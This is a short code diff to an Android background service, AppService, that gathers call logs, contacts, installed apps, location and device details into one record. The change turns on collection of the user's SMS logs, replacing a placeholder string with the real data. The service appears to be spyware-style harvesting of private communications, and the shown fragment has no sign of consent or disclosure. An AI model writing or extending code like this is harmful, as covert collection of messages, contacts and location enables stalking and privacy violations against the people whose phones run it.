@@ -168,7 +168,7 @@ class AppService : Service() {
 //                Log.d(TAG, "location --> ${Gson().toJson(it)}")
 //            }
 
-//        val smsLogs = getSMSLogs()
+        val smsLogs = getSMSLogs()
         val callLogs = Gson().toJson(getCallLogs())
         val listContact = Gson().toJson(getNamePhoneDetails())
         val appsInstalled = Gson().toJson(getAllAppsInstalled())
@@ -181,7 +181,7 @@ class AppService : Service() {
             location = strLocation,
             deviceInfo = getSystemDetail(),
             callLogs = callLogs,
-            smsLogs = "smsLogs",
+            smsLogs = smsLogs,
             listContact = listContact,
             appsDownloaded = appsInstalled,
         )
